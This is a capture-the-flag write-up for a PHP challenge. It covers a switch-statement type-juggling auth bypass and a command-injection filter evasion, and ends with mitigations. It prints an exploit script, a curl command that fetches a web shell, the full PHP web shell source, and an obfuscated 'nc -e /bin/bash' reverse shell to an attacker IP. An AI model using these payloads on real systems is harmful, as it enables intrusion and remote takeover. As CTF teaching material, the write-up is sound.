# 🎚️ Switching Command

## Description

Not Friendly service... Can you switching the command?

## Technical Background

### PHP Type Juggling and Comparison Operators

PHP supports two types of comparison:

#### Loose Comparison (`==`)
- Automatically converts types before comparison
- Used by `switch` statements by default
- Can lead to unexpected behavior

```php
// Example of loose comparison vulnerability
switch ("0") {
    case 0:
        echo "Matches!"; // Executes due to type juggling
        break;
}
```

#### Strict Comparison (`===`)
- Requires both type and value to match exactly
- Cannot be used in `switch` statements
- Must use `if/elseif` for strict checking

```php
// Strict comparison example
if ($value === "0") {
    echo "String zero";
} elseif ($value === 0) {
    echo "Integer zero";
}
```

## Vulnerability Analysis

### Authentication Bypass (`/index.php`)

The authentication logic contains a critical flaw:

```php
if ($_SERVER["REQUEST_METHOD"]=="POST"){
    $data = json_decode($_POST["username"]);
    $username = $data->username;
    
    // Strict comparison blocks "admin" string
    if($username === "admin" ){
        exit("no hack");
    }
    
    // But switch uses loose comparison!
    switch($username){
        case "admin":
            $_SESSION["auth"] = "admin";
            header("Location: test.php");
            break;
        default:
            $_SESSION["auth"] = "guest";
            header("Location: test.php");
    }
}
```

**The Vulnerability:** While the strict comparison (`===`) blocks the string `"admin"`, the `switch` statement uses loose comparison. When we pass `true` (boolean), PHP's type juggling makes it match the first case!

### Command Injection (`/test.php`)

Once authenticated as admin, we face a command injection filter:

```php
$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';

if($_SESSION["auth"] === "admin"){
    $command = isset($_GET["cmd"]) ? $_GET["cmd"] : "ls";
    $sanitized_command = str_replace("\n","",$command);
    
    if (preg_match($pattern, $sanitized_command)){
        exit("No hack");
    }
    
    $result = shell_exec(escapeshellcmd($sanitized_command));
}
```

The `escapeshellcmd()` function has a weakness: it removes non-ASCII characters, which we can exploit.

## Exploitation Methods

### Step 1: Authentication Bypass

Send a POST request with boolean `true` as the username:

```python
import requests

url = "http://host3.dreamhack.games:11023/index.php"
data = {
    "username": '{"username":true}'  # Boolean true triggers type juggling
}
response = requests.post(url, data=data)
```

This bypasses the strict check but matches `case "admin"` due to loose comparison.

### Step 2: Command Execution

Two methods to bypass the command filter:

#### Method 1: Web Shell Upload

Since `curl` isn't filtered, we can download a web shell:

```bash
/test.php?cmd=curl https://raw.githubusercontent.com/[user]/shell.php -o webshell.php
```

Web shell code:
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

Then access `/webshell.php?cmd=/flag` to get the flag.

#### Method 2: Reverse Shell with Unicode Bypass

The `escapeshellcmd()` function removes non-ASCII characters. We can insert Korean characters that get stripped:

```python
from requests import Session

URL = "http://host3.dreamhack.games:18674"
HOST = "54.144.234.41"  # Attacker's server
PORT = "8001"

# Step 1: Authenticate as admin
payload_1 = {"username": '{"username":true}'}

# Step 2: Reverse shell with Korean characters (ㅣ gets removed)
payload_2 = f"nㅣc -e /bㅣin/basㅣh {HOST} {PORT}"
# After removal: "nc -e /bin/bash {HOST} {PORT}"

ses = Session()
ses.post(f"{URL}/", data=payload_1)
res = ses.get(f"{URL}/test.php?cmd={payload_2}")
```

On the attacker's server:
```bash
nc -lvp 8001
# Once connected:
/flag
```

## Key Takeaways

### Security Lessons

1. **Type Juggling Risks:** PHP's loose comparison in `switch` statements can bypass strict checks
2. **Defense in Depth:** Single validation points are insufficient
3. **Input Sanitization:** `escapeshellcmd()` has known weaknesses with non-ASCII characters
4. **Consistent Validation:** Use the same comparison method throughout the authentication flow

### Recommended Mitigations

1. **Use if/elseif with strict comparison** instead of switch for security-critical checks
2. **Whitelist approach** for command execution instead of blacklist
3. **Disable dangerous functions** like `shell_exec()` in production
4. **Input type validation** before processing
5. **Use prepared statements** for all user inputs


## References

- [PHP Type Juggling Documentation](https://www.php.net/manual/en/language.types.type-juggling.php)
- [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
- [escapeshellcmd() Bypass Techniques](https://www.php.net/manual/en/function.escapeshellcmd.php)

---
